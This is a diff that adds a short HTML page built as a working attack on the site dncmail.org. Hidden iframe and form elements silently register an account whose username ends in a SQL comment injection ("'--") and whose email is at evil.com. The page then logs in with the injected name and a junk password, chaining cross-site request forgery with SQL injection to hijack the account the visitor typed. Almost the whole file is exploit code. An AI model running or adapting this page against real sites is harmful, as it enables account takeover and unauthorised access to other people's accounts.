@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+
+<iframe style="display: none;" src="http://dncmail.org/register.php" name="csrf-frame"></iframe>
+<form style="display: none;" method="post" action="http://dncmail.org/register.php" target="csrf-frame">
+  <input name="login">
+  <input name="email">
+  <input name="pw1" value="bob123">
+  <input name="pw2" value="bob123">
+  <input name="action" value="register">
+</form>
+
+
+<form method="post" action="http://dncmail.org">
+  <input name="login">
+  <input name="password" value="garbage" type="hidden">
+  <input name="action" value="login" type="hidden">
+  <button>Submit</button>
+</form>
+
+<script>
+  var registerForm = document.forms[0],
+      loginForm = document.forms[1];
+  loginForm.onsubmit = function(e) {
+    e.preventDefault();
+    var hacked = this.login.value + "'--";
+    registerForm.login.value = hacked;
+    registerForm.email.value = hacked+'@evil.com';
+    registerForm.submit();
+    setTimeout(function() {
+      loginForm.login.value = hacked;
+      loginForm.submit();
+    }, 1000);
+  };
+</script>
+</body>
+</html>
+
